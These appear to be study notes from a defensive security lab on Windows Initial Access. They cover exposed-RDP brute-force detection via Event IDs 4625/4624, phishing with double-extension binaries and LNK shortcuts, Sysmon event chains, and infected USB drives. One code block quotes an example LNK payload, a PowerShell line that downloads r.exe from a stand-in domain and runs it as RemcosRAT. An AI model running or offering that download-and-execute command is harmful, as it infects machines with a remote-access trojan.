# Windows Initial Access — Exposed Services, Phishing & Removable Media

## Overview

This document covers how attackers gain Initial Access to Windows systems: the two method groups (exposed services and user-driven methods) mapped to MITRE techniques, the risks of exposed RDP with a step-by-step breach detection walkthrough, the current state of phishing including binary and LNK attachments with a Sysmon event chain for detecting a malicious download, and the risks of removable media with how to spot an infected USB.

---

### Recap: What Is Initial Access

Picture the cyber world as a big city of skyscrapers and apartments, each protected by its own front door, and threat actors as criminals roaming the streets at night — some picking a lock patiently, others smashing doors with brute force, and some simply trying every door until one is left open. No matter the end goal, the first step of any attack is getting through that front door — the moment this succeeds is **Initial Access**. Methods fall into two groups: those that require an **exposed service**, and those that rely on **human interaction**.

---

### Exposed Services

Putting a Windows server directly on the Internet is routine — a website needs HTTP, a mail server needs SMTP, IT admins need RDP. But every exposed service is a risk: within minutes, automated bots scan for open ports, weak passwords, and unpatched vulnerabilities.

| MITRE Technique | Description |
|---|---|
| **T1133 — External Remote Services** | Threat actors look for exposed RDP/VNC/SSH with weak passwords to gain remote access |
| **T1190 — Exploit Public-Facing Application** | Threat actors look for misconfigured or vulnerable websites/applications |

### User-Driven Methods

Unless a user helps them, it's very hard for threat actors to infect a laptop that isn't Internet-exposed. But people regularly help attackers — clicking malicious links, running phishing attachments, using pirated software, or plugging in unknown USB devices. Since humans remain the weakest link and Windows is the dominant workstation OS, user-driven Initial Access alerts are extremely common.

| MITRE Technique | Description |
|---|---|
| **T1566 — Phishing** | Various phishing techniques trick users into launching malware themselves |
| **T1091 — Removable Media** | Threat actors infect a USB device, hoping it gets used across multiple PCs |

> Major ransomware groups such as **Medusa** and **Akira** have used *every one* of these techniques at least once in their campaigns (see Mandiant's M-Trends reports for current Initial Access trends).

---

### Risks of Exposed RDP

Exposing RDP with a weak password (e.g., `12345678`) typically leads to a breach within days. According to Censys Search, over **5,000,000** RDP-enabled machines are reachable from the Internet right now, and many are already compromised — defenders often nickname RDP the **"Ransomware Deployment Protocol"** because an RDP breach so frequently leads directly to ransomware.

#### Detecting an RDP Breach — Walkthrough

**Scenario:** An IT admin exposed RDP on a production server for weekend home access, with credentials `Administrator:Summer2025`. Investigated via Event Viewer against an `RDP-Security.evtx` file.

| Step | Attack Stage | Detection Opportunity |
|---|---|---|
| 1 | **Network Scan** — a botnet scans the IP and finds the exposed RDP port | N/A — network-level, out of log scope |
| 2 | **RDP Brute Force** — botnet tries common usernames (`Administrator`, `admin`, `support`, etc.) | Filter Security logs for **4625** (failed logons) → filter Logon Type **3** and **10** (remote logons) → filter by external **Source IP** → brute force confirmed |
| 3 | **Initial Access via RDP** — after ~100 attempts, the botnet guesses the correct password | Switch the same filtered view to **4624** (successful logons) → check the account used → that account is the Initial Access vector |
| 4 | **Further Malicious Actions** — two hours later, the threat actor logs in via RDP and browses the Desktop | Filter Logon Type **10** (interactive RDP) → copy the **Logon ID** → pivot to Sysmon logs with the same Logon ID → reveals every process the threat actor launched via RDP |

> A fully exposed, firewall-disabled RDP server will start accumulating hundreds of **4625** brute-force events within about an hour of going live — the pattern is unmistakable. Note that RDP can also be breached **without** a visible brute force if credentials were already known to the attacker.

**Practice file:** `C:\Users\Administrator\Desktop\Practice\RDP Case\RDP-Security.evtx`

---

### Current State of Phishing

Phishing remains a major threat because it bypasses the firewall entirely — if users have Internet access, they will eventually bring malware to their laptops themselves. Per the HoxHunt Phishing Trends Report 2025, phishing attacks increased **41x** since ChatGPT's 2022 release, and success rates remain high. Two key Windows-breach techniques: **malicious binaries** and **LNK attachments**.

#### Binary Attachments

Windows has many executable extensions beyond `.exe` — `.com`, `.scr`, `.cpl` — that users are far less cautious about. Windows also **hides known file extensions by default**, so `program.exe` displays as just `program`. Attackers exploit this by naming malware `invoice.pdf.exe` or `cat.png.com` and swapping the icon to match — producing a file that looks exactly like a harmless document or link in File Explorer.

#### LNK Attachments

To dodge AV detection, attackers often prefer PowerShell/VBS/BAT scripts over raw binaries, hidden behind an **LNK (shortcut) file** — the same file type used for ordinary desktop shortcuts. Any command can be placed in an LNK's "Target" field, and the icon can be freely spoofed; this is visible via right-click → Properties → Shortcut tab.

**Example payload chain** — an LNK disguised as "Visit Our Website!" that actually launches PowerShell to fetch and run **RemcosRAT**:

```
powershell.exe -c ...
# Download the encoded malware
(New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\ProgramData\r.exe');
# Run the malware (RemcosRAT)
start C:\ProgramData\r.exe;
```

**Practice files:** `C:\Users\Administrator\Desktop\Practice\Phishing Case 1-3`

#### Detecting a Malicious Download via Sysmon

A typical double-extension attachment attack leaves a clean Sysmon event chain:

```
1. Sysmon Event ID 1  — Web browser launches
   Image: ...\msedge.exe   ParentImage: ...\Explorer.EXE

2. Sysmon Event ID 11 — Archive appears in Downloads
   Image: ...\msedge.exe   TargetFilename: ...\Downloads\invoice.zip

3. Sysmon Event ID 11 — User extracts the archive
   Image: ...\Explorer.EXE (or 7zG.exe)   TargetFilename: ...\Downloads\invoice.pdf.exe

4. Sysmon Event ID 1  — User double-clicks the extracted file
   Image: ...\Downloads\invoice.pdf.exe   ParentImage: ...\Explorer.EXE
```

#### Notes on LNK Attachments

LNK files leave **little execution trace**. When a user launches a malicious shortcut, Windows Explorer reads the LNK's "Target" field and effectively makes it look like `explorer.exe` launched PowerShell directly — the LNK itself is not logged as the executor. To confirm LNK phishing (rather than another vector), look for a **preceding file-creation event**: the LNK file must have first appeared somewhere under Downloads.

**Practice file:** `C:\Users\Administrator\Desktop\Practice\Phishing Case 3\Phishing-Sysmon.evtx`

---

### Risks of Removable Media

Infected USB devices are far from obsolete, as shown by campaigns like **Camaro Dragon** and **Raspberry Robin**. Like phishing, USB-based Initial Access bypasses the firewall — it can start an infection chain with no Internet access at all, and can keep spreading without further user interaction.

**Real-world patterns:**

- **USB Delivery** — a "gift" package containing a USB drive labeled innocuously (e.g., "A gift from HR"); plugging it in shows a harmless decoy (e.g., a GIF) while malware silently spreads
- **Print Service** — a user hands a USB to a third-party print shop whose system is already infected; the malware copies itself onto the user's drive and travels home with them

#### Detecting an Infected USB

Most infections still require the **user to launch the malware themselves** via Explorer:

- Malware hides all legitimate files and drops a malicious `RECOVERY.lnk`
- Malware creates a `Photos.exe` binary disguised with a folder icon
- Malware creates double-extension copies of files, e.g., `photo_2024_1_12.jpg.exe`

Because both phishing and USB-based attacks rely on the user launching a binary through `explorer.exe`, distinguishing the two can be difficult. The telltale sign for USB is a process image originating from a **non-C: drive letter** (e.g., `E:\malware.exe`), indicating the process launched from removable media.

**Practice file:** `C:\Users\Administrator\Desktop\Practice\USB Case\USB-Sysmon.evtx`

---

### Quick Reference

| Topic | Key Detail |
|---|---|
| Initial Access definition | The moment a threat actor first gets through the "front door" |
| T1133 | External Remote Services (exposed RDP/VNC/SSH, weak passwords) |
| T1190 | Exploit Public-Facing Application |
| T1566 | Phishing |
| T1091 | Removable Media |
| RDP brute force detection | 4625, Logon Type 3/10, external Source IP |
| RDP successful breach | 4624 on the same filtered view; check the account used |
| Pivot to attacker actions | Logon ID (Security) → correlate with Sysmon events |
| Hidden extension abuse | `invoice.pdf.exe`, `cat.png.com` — Windows hides known extensions by default |
| LNK phishing | Payload in the "Target" field; appears as `explorer.exe` → PowerShell with no LNK execution trace |
| Malicious download chain | Sysmon 1 (browser) → Sysmon 11 (download) → Sysmon 11 (extract) → Sysmon 1 (execute) |
| USB infection tell | Process image path starts from a non-`C:` drive letter |
| Ransomware groups using all these | Medusa, Akira |

---

## Summary

- **Initial Access** is the moment an attacker first gets through the "front door," and methods fall into two groups: **exposed services** (**T1133** External Remote Services such as exposed RDP, VNC, or SSH with weak passwords, and **T1190** Exploit Public-Facing Application) and **user-driven methods** (**T1566** Phishing and **T1091** Removable Media) — all of which ransomware groups like Medusa and Akira have used.
- **Exposed RDP** with a weak password is typically breached within days (over 5 million RDP machines are reachable from the Internet, hence the nickname "Ransomware Deployment Protocol"); the detection walkthrough filters **4625** by Logon Type 3/10 and external source IP to confirm the brute force, switches to **4624** to find the account used, then pivots on the **Logon ID** from Logon Type 10 into Sysmon to see every process the attacker launched.
- **Phishing** bypasses the firewall entirely (up 41x since ChatGPT's 2022 release per HoxHunt), using **binary attachments** that exploit Windows hiding known extensions (`invoice.pdf.exe`, `cat.png.com`) and **LNK attachments** that put a PowerShell payload in the shortcut's "Target" field — such as one that downloads and runs RemcosRAT.
- A malicious download leaves a clean Sysmon chain — **Event ID 1** (browser launches) → **11** (archive downloaded) → **11** (archive extracted) → **1** (file executed) — while LNK execution leaves little trace, appearing as `explorer.exe` launching PowerShell, so confirm it by finding the earlier file-creation event for the LNK under Downloads.
- **Removable media** is still an effective, firewall-bypassing vector (Camaro Dragon, Raspberry Robin) via USB "gifts" and infected print shops; infected drives show hidden real files, a malicious `RECOVERY.lnk`, folder-icon binaries like `Photos.exe`, and double-extension copies, and the telltale sign is a process image running from a **non-C: drive letter** (e.g., `E:\malware.exe`).

